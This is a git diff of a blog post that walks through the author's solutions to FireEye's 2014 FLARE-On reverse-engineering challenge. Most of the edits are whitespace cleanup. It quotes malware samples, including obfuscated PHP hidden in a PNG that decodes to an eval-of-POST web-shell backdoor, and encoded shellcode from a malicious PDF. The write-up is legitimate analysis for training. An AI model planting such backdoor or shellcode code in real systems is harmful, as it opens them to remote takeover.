@@ -8,6 +8,8 @@ tags:
 comments: true
 date: 2014-09-23T02:31:44Z
 title: My Adventure with Fireeye FLARE Challenge
+aliases:
+- "/blog/2014-10-07-my-adventure-with-fireeye-flare-challenge/"
 ---
 
 These are my (rather long) solutions to Fireeye's FLARE challenge. This is just not the solution but other ways that I tried. This was a great learning experience for me so I am writing this post to document everything I tried. As a result, this post is somewhat long.
@@ -111,7 +113,7 @@ private void btnDecode_Click(object sender, EventArgs e)
 
 Line 4 reads ``dat_secret`` and the rest of the function manipulates it before displaying it on the form. To save this file expand ``resources`` and select ``rev_challenge_1.dat_secret.encode``. Right click and select ``Save Resource to File.``
 
-![Saving private secret](/images/2014/flare/1-4.jpg "Saving private secret") 
+![Saving private secret](/images/2014/flare/1-4.jpg "Saving private secret")
 
 I used ``HxD`` to look at the contents.
 
@@ -191,18 +193,18 @@ Most differences are aesthetic. There are two interesting differences. In line 5
 The challenge png is bigger. I used ``HxD`` to compare these two files (as they are not text) and at the end of ``flare-on.png`` I saw some PHP code. To be honest I was thinking of steganography or some [Ange Albertini magic](https://twitter.com/angealbertini). But that would have been too hard for level 2. Here is the PHP code (beautified):
 
 {{< codecaption lang="php" title="Code inside png" >}}
-<?php 
+<?php
 $terms=array("M", "Z", "]", "p", "\\", "w", "f", "1", "v", "<", "a", "Q", "z", " ", "s", "m", "+", "E", "D", "g", "W", "\"", "q", "y", "T", "V", "n", "S", "X", ")", "9", "C", "P", "r", "&", "\'", "!", "x", "G", ":", "2", "~", "O", "h", "u", "U", "@", ";", "H", "3", "F", "6", "b", "L", ">", "^", ",", ".", "l", "$", "d", "`", "%", "N", "*", "[", "0", "}", "J", "-", "5", "_", "A", "=", "{", "k", "o", "7", "#", "i", "I", "Y", "(", "j", "/", "?", "K", "c", "B", "t", "R", "4", "8", "e", "|");
 $order=array(59, 71, 73, 13, 35, 10, 20, 81, 76, 10, 28, 63, 12, 1, 28, 11, 76, 68, 50, 30, 11, 24, 7, 63, 45, 20, 23, 68, 87, 42, 24, 60, 87, 63, 18, 58, 87, 63, 18, 58, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 17, 37, 63, 58, 37, 91, 63, 83, 43, 87, 42, 24, 60, 87, 93, 18, 87, 66, 28, 48, 19, 66, 63, 50, 37, 91, 63, 17, 1, 87, 93, 18, 45, 66, 28, 48, 19, 40, 11, 25, 5, 70, 63, 7, 37, 91, 63, 12, 1, 87, 93, 18, 81, 37, 28, 48, 19, 12, 63, 25, 37, 91, 63, 83, 63, 87, 93, 18, 87, 23, 28, 18, 75, 49, 28, 48, 19, 49, 0, 50, 37, 91, 63, 18, 50, 87, 42, 18, 90, 87, 93, 18, 81, 40, 28, 48, 19, 40, 11, 7, 5, 70, 63, 7, 37, 91, 63, 12, 68, 87, 93, 18, 81, 7, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 18, 17, 37, 0, 50, 5, 40, 42, 50, 5, 49, 42, 25, 5, 91, 63, 50, 5, 70, 42, 25, 37, 91, 63, 75, 1, 87, 93, 18, 1, 17, 80, 58, 66, 3, 86, 27, 88, 77, 80, 38, 25, 40, 81, 20, 5, 76, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 7, 88, 32, 45, 7, 90, 52, 80, 58, 5, 70, 63, 7, 5, 66, 42, 25, 37, 91, 0, 12, 50, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 48, 19, 7, 63, 50, 5, 37, 0, 24, 1, 87, 0, 24, 72, 66, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 1, 87, 93, 18, 11, 66, 28, 18, 87, 70, 28, 48, 19, 7, 63, 50, 5, 37, 0, 18, 1, 87, 42, 24, 60, 87, 0, 24, 17, 91, 28, 18, 75, 49, 28, 18, 45, 12, 28, 48, 19, 40, 0, 7, 5, 37, 0, 24, 90, 87, 93, 18, 81, 37, 28, 48, 19, 49, 0, 50, 5, 40, 63, 25, 5, 91, 63, 50, 5, 37, 0, 18, 68, 87, 93, 18, 1, 18, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 90, 87, 0, 24, 72, 37, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 48, 19, 40, 90, 25, 37, 91, 63, 18, 90, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 75, 70, 28, 48, 19, 40, 90, 58, 37, 91, 63, 75, 11, 79, 28, 27, 75, 3, 42, 23, 88, 30, 35, 47, 59, 71, 71, 73, 35, 68, 38, 63, 8, 1, 38, 45, 30, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 23, 75, 77, 1, 28, 1, 43, 52, 31, 19, 75, 81, 40, 30, 75, 1, 27, 75, 77, 35, 47, 59, 71, 71, 71, 73, 21, 4, 37, 51, 40, 4, 7, 91, 7, 4, 37, 77, 49, 4, 7, 91, 70, 4, 37, 49, 51, 4, 51, 91, 4, 37, 70, 6, 4, 7, 91, 91, 4, 37, 51, 70, 4, 7, 91, 49, 4, 37, 51, 6, 4, 7, 91, 91, 4, 37, 51, 70, 21, 47, 93, 8, 10, 58, 82, 59, 71, 71, 71, 82, 59, 71, 71, 29, 29, 47);
 
 $do_me="";
 
-for ($i=0;$i<count($order);$i++) 
+for ($i=0;$i<count($order);$i++)
 {
 	$do_me=$do_me.$terms[$order[$i]];
 }
 
-eval($do_me); 
+eval($do_me);
 ?>
 {{< /codecaption >}}
 
@@ -229,7 +231,7 @@ eval($___($__));
 {{< /codecaption >}}
 
 Contents of ``$_`` and ``$__`` are clearly encoded in ``base64`` and  ``$___`` is ``base64_decode``. Base64 can be decoded in Python by calling ``base64.b64decode``.
-Line #4 can be re-written as 
+Line #4 can be re-written as
 
 {{< codecaption lang="php" title="Line 4" >}}
 
@@ -245,9 +247,9 @@ So it must decode the first base64 blob and eval it. Let's decode it:
 
 {{< codecaption lang="php" title="Decoded line 4" >}}
 
-if(isset($_POST["\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D"])) 
-{ 
-eval(base64_decode($_POST["\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D"])); 
+if(isset($_POST["\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D"]))
+{
+eval(base64_decode($_POST["\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D"]));
 }
 
 {{< /codecaption >}}
@@ -337,7 +339,7 @@ PDFiD 0.0.11 APT9001.pdf
 
 # first 512 bytes of the PDF removed
 
-# To list the streams that are encoded and see what filters the stream is using type "pdfilter": 
+# To list the streams that are encoded and see what filters the stream is using type "pdfilter":
 [0x00000000]> pdfilter
 Stream 1 uses FlateDecode
 Stream 1 uses ASCIIHexDecode
@@ -389,7 +391,7 @@ Encoded Stream 1
 --------------------------------------------------------------------------------
     var HdPN = "";
     var zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf = "";
-    
+
     // important
     var IxTUQnOvHg = unescape("%u72f9%u4649%u1525%u7f0d%u3d3c%ue084%ud62a%ue139%
 ua84a%u76b9%u9824%u7378%u7d71%u757f%u2076%u96d4%uba91%u1970%ub8f9%ue232%u467b%u9
@@ -473,17 +475,17 @@ The following Python code does it. On a side note, we really need a string xor o
 def xor(mydata,mykey):
     keylen = len(mykey)
     datalen = len(mydata)
-    
+
     # easier to just extend the key array, but probably not that efficient
     # not that we care about it here ;)
-    key = mykey * ( (datalen/keylen)+1 ) 
-    
+    key = mykey * ( (datalen/keylen)+1 )
+
     return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(mydata,key))
-    
+
 from binascii import hexlify, unhexlify
 
 # last 13 bytes
-ciphertext = unhexlify("2574243575216B2A36366B2F3274752E2A2305316B203723256B2B2D46")[-13:] 
+ciphertext = unhexlify("2574243575216B2A36366B2F3274752E2A2305316B203723256B2B2D46")[-13:]
 plaintext = "@flare-on.com"
 
 print xor(ciphertext,plaintext)
@@ -523,7 +525,7 @@ Let's apply the xor-logic on this string too.
 from binascii import hexlify, unhexlify
 
 # last 13 bytes
-ciphertext = unhexlify("352474252a6b21752f6b36362e7574323105232a2337206b2d2b6b252d28")[-13:] 
+ciphertext = unhexlify("352474252a6b21752f6b36362e7574323105232a2337206b2d2b6b252d28")[-13:]
 plaintext = "@flare-on.com"
 
 print xor(ciphertext,plaintext)
@@ -789,7 +791,7 @@ Inside ``sub_1000A4C0`` we can see that the jump to return is never taken. Becau
 
 .text:1000A51B loc_1000A51B:
 .text:1000A51B movsx   eax, [ebp+var_8]   ; eax = 0
-.text:1000A51F cmp     eax, [ebp+var_10]  ; if (0 => size of array) 
+.text:1000A51F cmp     eax, [ebp+var_10]  ; if (0 => size of array)
 .text:1000A522 jge     short loc_1000A554 ; if (no memory was allocated) - jump to loc_1000A554
 
 ; if memory was allocated
@@ -908,11 +910,11 @@ md5       e7bc5d2c0cf4480348f5504196561297
 type      ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=0xa26451c6440ccb470f9cb8cabf8069c01120086c, stripped
 {{< /codecaption >}}
 
-I started a Kali 64-bit VM in VirtualBox. Less mess with it a bit. I used IDA Remote Linux Debugger. IDA was running on my host OS and the binary was in the Kali 64-bit VM. 
+I started a Kali 64-bit VM in VirtualBox. Less mess with it a bit. I used IDA Remote Linux Debugger. IDA was running on my host OS and the binary was in the Kali 64-bit VM.
 
 {{< codecaption lang="bash" title="Running commands" >}}
 # the same as the website
-$ file e7bc5d2c0cf4480348f5504196561297 
+$ file e7bc5d2c0cf4480348f5504196561297
 e7bc5d2c0cf4480348f5504196561297: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=0xa26451c6440ccb470f9cb8cabf8069c01120086c, stripped
 
 $ strings e7bc5d2c0cf4480348f5504196561297
@@ -925,12 +927,12 @@ info[20]->d_un.d_val == 7
 ...
 
 # let's see shared library calls - nope
-$ ltrace ./e7bc5d2c0cf4480348f5504196561297 
+$ ltrace ./e7bc5d2c0cf4480348f5504196561297
 ltrace: Couldn't find .dynsym or .dynstr in "./e7bc5d2c0cf4480348f5504196561297"
 
 # Let's run the binary manually
 # running it normally
-$ ./e7bc5d2c0cf4480348f5504196561297 
+$ ./e7bc5d2c0cf4480348f5504196561297
 no
 
 # one argument - different message
@@ -949,7 +951,7 @@ bad
 $ ./e7bc5d2c0cf4480348f5504196561297 arg11111 arg2 arg3
 stahp
 
-# four arguments - message is the same - we should stop 
+# four arguments - message is the same - we should stop
 $ ./e7bc5d2c0cf4480348f5504196561297 arg11111 arg2 arg3 arg4
 stahp
 {{< /codecaption >}}
@@ -1081,7 +1083,7 @@ What does ``repne scasb`` do?
 
 {{< /codecaption >}}
 
-Null terminator or ``0x00`` is saved in eax in line 6. Line 7 has ``rcx``. We don't want ``rcx`` to reach zero before the end of the string. First argument is saved in ``rdi`` in line 8 and finally line 9 calls ``repne scasb``. This is basically ``strlen(arg1)``. In line 14, it is checked if the length of first argument is 10. If so we will jump. 
+Null terminator or ``0x00`` is saved in eax in line 6. Line 7 has ``rcx``. We don't want ``rcx`` to reach zero before the end of the string. First argument is saved in ``rdi`` in line 8 and finally line 9 calls ``repne scasb``. This is basically ``strlen(arg1)``. In line 14, it is checked if the length of first argument is 10. If so we will jump.
 
 {{< codecaption lang="nasm" title="strlen_arg1_equals_10" >}}
 
@@ -1139,9 +1141,9 @@ We can see that arg1 is saved to ``rdi`` in line 5 and ``sub_468BB0`` is called.
 We see another ``repne scasb``. We have seen these instructions before. At the end of the code snippet, we go back to the top (notice the offsets for first and last line). This code loops through first argument and xors it with ``0x56``.
 
 {{< codecaption lang="cpp" title="loc_437177" >}}
-for (int i=0; i<11 ; i++) 
-{ 
-  arg1[i] = arg1[i] ^ 0x56; 
+for (int i=0; i<11 ; i++)
+{
+  arg1[i] = arg1[i] ^ 0x56;
 }
 {{< /codecaption >}}
 
@@ -1198,17 +1200,17 @@ I patched it and continued. Application crashed a few times in between and I had
 
 This is obviously shellcode, pushed to the stack and called. Bytes of the second argument are manipulated and then compared with some hardcoded value. I have only included the first 2 bytes here. For example ``arg2[0] ror 0xF2 must equal 0x1B``, otherwise ``jz`` will be called and application will terminate in ``loc_7FFF3A5AC3A6``. I saw around 30 checks meaning that argument 2 must be 30 bytes or so. I wrote the following Python code to calculate the second argument.
 
-Python does not have ``ror`` and ``rol`` binary operators so I stole them from [here](http://www.falatic.com/index.php/108/python-and-bitwise-rotation). 
+Python does not have ``ror`` and ``rol`` binary operators so I stole them from [here](http://www.falatic.com/index.php/108/python-and-bitwise-rotation).
 
 {{< codecaption lang="python" title="Second argument" >}}
-# rol and ror implementations taken from 
+# rol and ror implementations taken from
 # http://www.falatic.com/index.php/108/python-and-bitwise-rotation
 
 # Rotate left: 0b1001 --> 0b0011
 rol = lambda val, r_bits, max_bits=8: \
     (val << r_bits%max_bits) & (2**max_bits-1) | \
     ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
- 
+
 # Rotate right: 0b1001 --> 0b1100
 ror = lambda val, r_bits, max_bits=8: \
     ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
@@ -1220,11 +1222,11 @@ for x in range(32):
 
 arg2[0] = rol(0x1B,0xF2)
 
-arg2[1] = (0x40 ^ 0xF2 ^ 0xB3 ^ 0x30) 
+arg2[1] = (0x40 ^ 0xF2 ^ 0xB3 ^ 0x30)
 
 arg2[2] = (0x1F ^ 0x71)
 
-arg2[3] =  rol(0xB0 , 0xBC)  - 0xA3 
+arg2[3] =  rol(0xB0 , 0xBC)  - 0xA3
 
 arg2[4] =  ( 0xE8 + 0x79 )
 
@@ -1232,7 +1234,7 @@ arg2[5] = rol( 0xf6 + 0x28 , 0x82)
 
 arg2[6] = rol( 0x1f - 0x2c, 0x4d ) + 0xb0
 
-arg2[7] = ror( rol(0xAF - 0x3F , 0x2A) ^ 0xb8 , 0x99 ) - 0x54 
+arg2[7] = ror( rol(0xAF - 0x3F , 0x2A) ^ 0xb8 , 0x99 ) - 0x54
 
 arg2[8] = rol( 0x5D , 0xBA )
 
@@ -1308,7 +1310,7 @@ gethostbyname ( "www.dogecoin.com" )
 gethostbyname ( "e.root-servers.net" )
 {{< /codecaption >}}
 
-I was curious about these connections so I captured the traffic using ``Wireshark`` from launch to crash. 
+I was curious about these connections so I captured the traffic using ``Wireshark`` from launch to crash.
 
 {{< codecaption lang="powershell" title="Traffic summary - some lines omitted" >}}
 
@@ -1668,7 +1670,7 @@ If ``NtGlobalFlag`` is not ``0x70`` then ``\x09\x00\x00\x01`` will be xor-ed wit
 {{< codecaption lang="python" title="NtGlobalFlag" >}}
 if (NtGlobalFlag == 0x70):
     blob = xor(blob,"Feel the sting of the monarch!")
-    
+
 else:
     blob = xor(blob,"\x09\x00\x00\x01")
 {{< /codecaption >}}
@@ -1774,7 +1776,7 @@ Another check. This time the application retrieves the IP for ``www.dogecoin.com
 {{< codecaption lang="cpp" title="hostent structure (for Win32)" >}}
 typedef struct hostent {
   char FAR      *h_name;        // index: 0
-  char FAR  FAR **h_aliases;    // index: 4 
+  char FAR  FAR **h_aliases;    // index: 4
   short         h_addrtype;     // index: 8
   short         h_length;       // index: 9
   char FAR  FAR **h_addr_list;
@@ -2129,43 +2131,43 @@ Here's my bruteforcer. This is not good code but at that point I just wanted to 
 key1={}
 key1[0]='oh happy dayz'
 key1[1]='the final countdown'
- 
+
 key2={}
 key2[0]='UNACCEPTABLE!'
 key2[1]='omglob'
- 
+
 key3={}
 key3[0]='you\x27re so good'
 key3[1]='you\x27re so bad'
- 
+
 key4={}
 key4[0]='\x66'
 key4[1]='\x01'
- 
+
 key5={}
 key5[0]='Sandboxes are fun to play in'
 key5[1]='I\x27m gonna sandbox your face'
- 
+
 key6={}
 key6[0]='I can haz decode?'
 key6[1]='Such fire. Much burn. Wow.'
- 
+
 key7={}
 key7[0]='\x09\x00\x00\x01'
 key7[1]='Feel the sting of the Monarch!'
- 
+
 key8={}
 key8[0]='! 50 1337'
 key8[1]='1337'
- 
+
 key9={}
 key9[0]='LETS GO SHOPPING'
 key9[1]='MATH IS HARD'
- 
+
 key10={}
 key10[0]='LETS GO MATH'
 key10[1]='SHOPPING IS HARD'
- 
+
 key11={}
 key11[0]='\x01\x02\x03\x05\x00\x78\x30\x38\x0d'
 key11[1]='\x07\x77'
@@ -2173,11 +2175,11 @@ key11[1]='\x07\x77'
 key12={}
 key12[0]="backdoge.exe"
 key12[1]="\x00"
- 
+
 key13={}
 key13[0]='192.203.230.10'
 key13[1]='\x00'
- 
+
 key14={}
 key14[0]='\x00'
 key14[1]='jackRAT'
@@ -2192,11 +2194,11 @@ for i in xrange(15):
 def xor(mydata,mykey):
     keylen = len(mykey)
     datalen = len(mydata)
-    
+
     # easier to just extend the key array, but probably not that memory efficient
     # not that we care about it here ;)
-    key = mykey * ( (datalen/keylen)+1 ) 
-    
+    key = mykey * ( (datalen/keylen)+1 )
+
     return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(mydata,key))
 
 
@@ -2241,14 +2243,14 @@ for index[1] in xrange(2):
                             out = xor(out,key12[index[12]])
                             out = xor(out,key13[index[13]])
                             out = xor(out,key14[index[14]])
-                            
+
                             if ( out[0]=='M' and out[1]=='Z'):
                               print "Found it"
                               print out
                               print hexlify(out)
-                          
+
                               out = wholefile
-                              
+
                               out = xor(out,key1[ind1])
                               out = xor(out,key2[ind2])
                               out = xor(out,key3[ind3])
@@ -2263,12 +2265,12 @@ for index[1] in xrange(2):
                               out = xor(out,key13[ind13])
                               out = xor(out,key14[ind14])
                               out = xor(out,'backdoge.exe')
-                          
+
                               decodedfilename = "c:\\gratz" + str(counter) + ".exe"
                               decodedfile = file(decodedfilename,'wb')
                               decodedfile.write(out)
                               decodedfile.close()
-                                
+
                             # be sure to reset the wholefile after reading it, thanks Curtis :)                                                                  
                             out = wholefile[:0x10]
                             counter +=1
